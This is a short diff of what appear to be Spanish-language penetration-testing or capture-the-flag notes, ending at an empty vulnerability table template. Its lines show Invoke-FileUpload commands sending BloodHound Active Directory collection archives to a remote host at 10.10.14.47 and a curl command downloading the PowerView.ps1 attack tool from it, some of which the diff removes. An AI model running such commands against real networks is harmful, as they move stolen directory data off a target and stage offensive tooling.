@@ -183,10 +183,12 @@ Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_Bloo
 ![[Pasted image 20240629132729.png]]
 
 
-Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629112011_BloodHound.zip"
 
 
-curl 10.10.14.47:80/PowerView.ps1 -o PowerView.ps1
+
+
+
+
 ### Vulnerabilidades
 
 | CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel | Link |
